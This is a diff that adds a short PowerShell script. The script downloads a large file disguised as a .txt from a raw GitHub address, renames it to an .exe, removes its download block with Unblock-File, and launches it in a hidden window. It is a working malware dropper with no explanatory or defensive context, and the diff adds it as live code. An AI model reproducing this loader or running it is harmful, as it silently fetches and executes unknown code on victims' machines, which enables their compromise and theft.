@@ -1,0 +1,25 @@
+$urls = @("https://raw.githubusercontent.com/hellow2003/phpcode/main/dirfinal.txt")
+$timeout = 300
+$tempDir = $env:TEMP
+$base = "pld"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$downloaded = $null
+foreach ($u in $urls) {
+    $tmp = Join-Path $tempDir "$base`_$(Get-Date -Format 'yyyyMMddHHmmss').txt"
+    try {
+        Invoke-WebRequest -Uri $u -OutFile $tmp -TimeoutSec $timeout -ErrorAction Stop
+        if ((Test-Path $tmp) -and ((Get-Item $tmp).Length -gt 10MB)) {
+            $downloaded = $tmp
+            break
+        } else {
+            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
+        }
+    } catch {
+        if (Test-Path $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue }
+    }
+}
+if (-not $downloaded) { throw "All URLs failed or file too small." }
+$exe = [System.IO.Path]::ChangeExtension($downloaded, ".exe")
+Move-Item $downloaded $exe -Force
+Unblock-File $exe -ErrorAction SilentlyContinue
+Start-Process -FilePath $exe -WindowStyle Hidden
